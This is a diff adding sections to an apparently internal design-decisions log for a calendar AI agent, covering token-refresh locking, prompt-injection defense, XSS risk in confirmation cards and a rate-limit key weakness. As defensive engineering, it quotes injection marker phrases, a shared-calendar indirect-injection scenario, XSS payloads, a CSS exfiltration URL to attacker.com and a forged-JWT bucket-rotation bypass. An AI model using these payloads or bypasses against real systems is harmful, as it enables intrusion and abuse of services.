@@ -16,10 +16,11 @@ When a user's Google OAuth access token expires, the agent refreshes it before c
 
 ### What we built (MVP)
 
-Per-user `asyncio.Lock` with a double-check pattern:
+Per-user `asyncio.Lock` with a double-check pattern, stored in a bounded `OrderedDict` with LRU eviction (maxsize=1024, added in #100):
 
 ```python
-_refresh_locks: dict[str, asyncio.Lock] = {}
+_REFRESH_LOCK_MAXSIZE = 1024
+_refresh_locks: OrderedDict[str, asyncio.Lock] = OrderedDict()
 
 async def _get_credentials(user_id):
     stored = await get_token(user_id)
@@ -31,11 +32,14 @@ async def _get_credentials(user_id):
                 stored = await _refresh_token_for_tool(user_id, stored)
 ```
 
+If a lock is evicted while held (extremely unlikely at 1024 capacity), a concurrent refresh for the same user may run in parallel — harmless since the refresh operation is idempotent.
+
 ### Why this is sufficient for now
 
 - MVP runs a single Container App replica (one Python process)
 - `asyncio.Lock` serializes all coroutines within that process
 - Even without the lock, the race is benign — both refreshes succeed and whichever `store_token` runs last stores a valid token
+- Bounded at 1024 entries prevents memory leaks in long-running processes
 
 ### When this breaks
 
@@ -320,3 +324,280 @@ If the architecture adds Postgres for user profiles or other durable state, sync
 - Redis failover event causes visible re-ingest storm (mass `"Starting full ingest"` logs)
 - Scaling beyond 10 active users
 - Moving to multi-replica deployment where Redis persistence becomes critical
+
+---
+
+## 5. Prompt Injection Defense — Regex-Only vs Azure Prompt Shields
+
+**Date:** 2026-03-17
+**Audit finding:** W10
+**File:** `backend/app/agents/guardrails.py`
+
+### The problem
+
+The SPEC defines the input guard as "Prompt Shields + regex." Azure Prompt Shields is Microsoft's dedicated ML model for detecting direct and indirect prompt injection attacks. The current implementation uses regex pattern matching for injection detection and Azure Content Safety harm categories (HATE, SELF_HARM, SEXUAL, VIOLENCE) for content moderation — but these are different APIs serving different purposes. Harm categories detect toxic content, not injection attempts.
+
+### What we built (MVP)
+
+Two-layer input defense:
+1. **Regex patterns** — detect common injection markers (`ignore previous`, `system:`, delimiter sequences, role-play attempts, canary token leakage)
+2. **Azure Content Safety** — blocks harmful content (hate, self-harm, sexual, violence) via the `analyze_text` API
+
+The output guard also uses Content Safety to filter agent responses.
+
+### Why this is sufficient for now
+
+- The sandwich defense prompt pattern (system → user → system reminder) provides structural protection independent of the input guard
+- Regex catches the most common injection patterns (instruction overrides, role hijacking)
+- The agent is scoped to calendar operations with bounded tools — even a successful injection can only call `search_events`, `create_event`, `update_event`, `delete_event` (all gated by human-in-the-loop confirmation for writes)
+- Canary token detection catches extraction attempts
+- The attack surface is limited: single-user context, no cross-user data access (user_id filter enforced)
+
+### When this breaks
+
+- Sophisticated indirect injection via calendar event descriptions (e.g., a shared calendar event containing crafted instructions)
+- Adversarial users who iterate on bypassing regex patterns
+- Compliance requirements that mandate ML-based injection detection
+- Adding tools with broader capabilities (email send, file access) that increase the blast radius of a successful injection
+
+### The upgrade path — Azure Prompt Shields
+
+Prompt Shields is available on the same Content Safety resource already deployed. The API call is similar to the existing `analyze_text`:
+
+```python
+from azure.ai.contentsafety.models import AnalyzeTextOptions
+
+# Current: harm category detection
+result = client.analyze_text(AnalyzeTextOptions(text=user_input))
+
+# Addition: prompt injection detection
+# Uses the same client, same endpoint, different API
+shield_result = client.analyze_text(
+    AnalyzeTextOptions(
+        text=user_input,
+        categories=[],  # skip harm categories
+        output_type="EightSeverityLevels",
+    )
+)
+# Or use the dedicated Prompt Shields endpoint:
+# POST {endpoint}/text/shieldPrompt?api-version=2024-09-01
+```
+
+Key details:
+- **No new Azure resource** — uses the existing Content Safety deployment
+- **~50ms additional latency** per message (runs in parallel with existing harm check)
+- **No new RBAC roles** — the backend identity already has `Cognitive Services User` on Content Safety
+- Can run both checks concurrently with `asyncio.gather` to minimize latency impact
+
+### Trigger to upgrade
+
+- Evidence of injection attempts bypassing regex (visible in logs from the `input_guard` node)
+- Adding tools with higher blast radius (email, file access)
+- Moving toward multi-tenant or enterprise deployment
+- Security audit or compliance review requiring ML-based injection defense
+
+---
+
+## 6. Untrusted Content in Confirmation Cards — React Escaping Only
+
+**Date:** 2026-03-17
+**Issue:** #101 (Confirmation Card)
+**Files:** `frontend/src/components/chat/ConfirmationCard.tsx`, `frontend/src/lib/format-confirmation.ts`, `backend/app/agents/router.py`
+
+### The problem
+
+The confirmation card renders data that originates from two untrusted sources:
+
+1. **User's calendar (indirect injection):** The agent calls `search_events` to read existing events, then may propose an update or deletion. The event `summary`, `description`, `location`, and `attendees` come from Google Calendar — which includes events shared by other people. A malicious actor could share a calendar event containing `<script>alert('xss')</script>` in the title or `[Click here](javascript:void)` in the description. When the agent proposes modifying that event, the malicious content flows into the confirmation card.
+
+2. **LLM output (prompt injection):** If the LLM is manipulated (via indirect prompt injection from event descriptions or direct user input), it could propose creating an event whose fields contain malicious payloads. The tool's `interrupt()` call passes whatever the LLM generated — `summary`, `description`, `location` — directly into the SSE confirmation event.
+
+In both cases, the data path is: **Google Calendar API → agent tool → `interrupt(event_details)` → SSE `confirmation` event → `useChat` state → `ConfirmationCard` render**. No layer in this chain performs explicit sanitization.
+
+### What we built (MVP)
+
+No sanitization at any layer. The confirmation card relies entirely on React's default JSX text escaping:
+
+```tsx
+// ConfirmationCard.tsx — values rendered as text nodes
+<dd>{field.value}</dd>
+
+// format-confirmation.ts — values passed through as strings
+fields.push({ label: "Event", value: details["summary"] });
+fields.push({ label: "Description", value: details["description"] });
+```
+
+React's JSX interpolation (`{expression}`) creates text nodes, not HTML. A malicious `<script>alert('xss')</script>` renders as the literal string `<script>alert('xss')</script>` in the DOM — the browser never parses it as markup.
+
+### Why this is sufficient for now
+
+- **React auto-escaping is robust.** JSX text interpolation has been React's primary XSS defense since React 0.x. It escapes `<`, `>`, `&`, `"`, and `'` in text content. This is not a hack or workaround — it's a deliberate security feature of the framework.
+- **No dangerous rendering patterns exist.** The component uses no `dangerouslySetInnerHTML`, no dynamic `href`/`src` attributes, no `eval()`, no CSS injection vectors. Values are only ever rendered as `<dd>` text content.
+- **The attack surface is bounded.** Even if rendering were somehow bypassed, the confirmation card is a local UI element — it can't exfiltrate data to a third party unless the attacker also controls a network endpoint, which requires a separate vulnerability.
+- **Write operations require explicit user approval.** The confirmation card is the human-in-the-loop gate. A user seeing `<script>alert('xss')</script>` in an event title would reject it. The malicious content is visible, not hidden.
+
+### When this breaks
+
+1. **Markdown or rich text rendering.** If anyone adds a Markdown renderer (e.g., `react-markdown`) or `dangerouslySetInnerHTML` to format event descriptions with line breaks, links, or bold text, the XSS protection disappears immediately. This is the most likely regression path — a developer adds "just a simple Markdown renderer" for better formatting without realizing the content is untrusted.
+
+2. **Link rendering from event data.** If attendee emails become `mailto:` links, or locations become Google Maps links constructed from event data, an attacker could inject `javascript:` URIs or crafted URLs that redirect to phishing pages.
+
+3. **CSS injection.** If event data is ever used in `style` attributes or CSS custom properties (e.g., color-coding events by category), an attacker could inject CSS that overlays fake UI elements or exfiltrates data via `background-image: url(attacker.com/steal?data=...)`.
+
+4. **Server-side rendering context.** If the confirmation card is ever rendered server-side (SSR) outside React's JSX context — for example, in an email notification or a Slack webhook — the auto-escaping doesn't apply and the raw HTML would be interpreted.
+
+### The upgrade path — Explicit sanitization at the boundary
+
+Add sanitization where untrusted data enters the frontend, so safety doesn't depend on every future developer remembering that React escaping is the only defense:
+
+**Option A: Sanitize in the SSE event handler (recommended)**
+
+Strip HTML from confirmation details as they arrive, before they enter React state:
+
+```typescript
+// lib/sanitize.ts
+function stripHtml(input: string): string {
+  // Replace HTML tags, then decode entities for display
+  return input.replace(/<[^>]*>/g, "").replace(/&[a-z]+;/gi, " ");
+}
+
+// hooks/useChat.ts — in handleEvent()
+case "confirmation": {
+  const sanitized = Object.fromEntries(
+    Object.entries(event.details).map(([k, v]) => [
+      k,
+      typeof v === "string" ? stripHtml(v) : v,
+    ]),
+  );
+  dispatch({
+    type: "CONFIRMATION_RECEIVED",
+    confirmation: { ...event, details: sanitized, status: "pending" },
+  });
+}
+```
+
+This protects all downstream rendering regardless of future component changes.
+
+**Option B: Sanitize on the backend before SSE emission**
+
+Strip HTML in `_stream_response()` when building the confirmation event, so the frontend never sees raw HTML:
+
+```python
+import re
+
+def _strip_html(text: str) -> str:
+    return re.sub(r"<[^>]*>", "", text)
+
+# In _stream_response(), when building the confirmation event:
+sanitized = {
+    k: _strip_html(v) if isinstance(v, str) else v
+    for k, v in interrupt_value.items()
+}
+confirmation_event = {
+    "type": "confirmation",
+    "action": sanitized["action"],
+    "action_id": action_id,
+    "details": sanitized,
+}
+```
+
+**Option C: Use DOMPurify (if rich text is needed later)**
+
+If event descriptions need to support formatting:
+
+```typescript
+import DOMPurify from "dompurify";
+
+// Allow safe inline formatting only
+const clean = DOMPurify.sanitize(description, {
+  ALLOWED_TAGS: ["b", "i", "em", "strong", "br"],
+  ALLOWED_ATTR: [],
+});
+```
+
+### Trigger to upgrade
+
+- Any PR that adds Markdown rendering, `dangerouslySetInnerHTML`, or link rendering to chat components
+- Adding email/Slack notifications that render event data outside React
+- Security audit or pen test that flags the lack of explicit sanitization
+- Evidence of calendar events with HTML/script payloads in production logs
+
+---
+
+## 7. Rate-Limit Key — Unverified JWT Sub vs Verified User ID
+
+**Date:** 2026-03-17
+**Issue:** #100 (Rate Limiter + Bounded Locks)
+**File:** `backend/app/core/middleware.py`
+
+### The problem
+
+SPEC requires 20 requests/minute per authenticated user on the chat endpoint. slowapi's `key_func` runs synchronously before FastAPI dependency injection, so we can't call the async `get_current_user` (which verifies the JWT signature against Google's public keys) to get a verified user ID for the rate-limit bucket.
+
+### What we built (MVP)
+
+`get_user_from_token` extracts the `sub` claim from the JWT payload via base64 decoding — no signature verification. Falls back to IP address (`get_remote_address`) when the token is missing, malformed, or lacks a `sub` claim.
+
+```python
+def get_user_from_token(request: Request) -> str:
+    """Decode JWT payload for sub claim; fall back to IP."""
+    try:
+        auth = request.headers.get("authorization", "")
+        token = auth[7:]  # strip "Bearer "
+        payload = base64url_decode(token.split(".")[1])
+        sub = json.loads(payload).get("sub")
+        return sub if isinstance(sub, str) and sub else get_remote_address(request)
+    except Exception:
+        return get_remote_address(request)
+```
+
+### The concern — forged sub claim for bucket rotation
+
+An attacker can craft a three-part Bearer token with an arbitrary `sub` claim (e.g., `"attacker-1"`, `"attacker-2"`) to get a separate rate-limit bucket per forged identity, sidestepping the 20/min per-user limit.
+
+### Why this is sufficient for now
+
+1. **Auth still rejects the request.** `Depends(get_current_user)` verifies the JWT signature after the rate-limit check. A forged token always results in 401 — the attacker never reaches the agent.
+2. **The rate-limit counter still increments.** slowapi counts the request before the handler runs. After 20 forged requests as `"attacker-1"`, that bucket is exhausted — the attacker must rotate to a new fake sub.
+3. **Auth verification is cheap.** Google's signing cert is cached locally via `CacheControl(requests.Session())` for ~5.5 hours. Subsequent verifications are CPU-only (~1-5ms), no network call.
+4. **No per-IP backstop for bearer requests.** Both the global 60/min default and the per-route 20/min limit use `get_user_from_token` as the key function. When a Bearer token is present (even forged), the key is the `sub` claim — not the IP. An attacker rotating forged sub values gets a fresh bucket per sub for all limits. Requests without a Bearer token correctly fall back to IP-based limiting. See `backend/app/core/middleware.py:21-50` for the key function implementation.
+5. **No data exfiltration.** The attacker gains nothing — no access to the chat endpoint, no calendar data, no side effects. The only cost is wasted CPU on signature verification (~5ms per request). In practice, ASGI server connection limits and infrastructure-level rate limiting (load balancer, Azure Front Door) provide an outer defense layer.
+
+### When this breaks
+
+- Distributed bot farm (many IPs) making probing requests with forged Bearer tokens — each forged sub gets its own rate-limit bucket with no IP-based floor, enabling unlimited 401s limited only by infrastructure capacity
+- Compliance requirement for verified-identity rate limiting (e.g., SOC 2 audit)
+- Moving the chat endpoint behind a public API gateway without additional rate limiting at the gateway level
+
+### The upgrade path — Verified user ID in middleware
+
+Set a verified `user_id` on `request.state` in a custom middleware that runs before slowapi, then read it in the key function:
+
+```python
+# Middleware (runs before SlowAPI)
+class AuthStateMiddleware:
+    async def dispatch(self, request, call_next):
+        try:
+            user = await verify_token(request)
+            request.state.verified_user_id = user.id
+        except Exception:
+            request.state.verified_user_id = None
+        return await call_next(request)
+
+# Key function
+def get_rate_limit_key(request: Request) -> str:
+    user_id = getattr(request.state, "verified_user_id", None)
+    return user_id if user_id else get_remote_address(request)
+```
+
+Key details:
+- Adds ~1-5ms latency per request (cached cert verification) — acceptable for auth endpoints
+- Requires restructuring middleware order: Auth State → SlowAPI → CORS
+- Eliminates the forged sub bypass entirely
+- Falls back to IP for unauthenticated requests (login, health check, etc.)
+
+### Trigger to upgrade
+
+- Evidence of distributed probing (many IPs with failed auth) visible in logs
+- SOC 2 or similar compliance audit requiring verified-identity rate limiting
+- Adding a public API surface beyond the Next.js frontend proxy
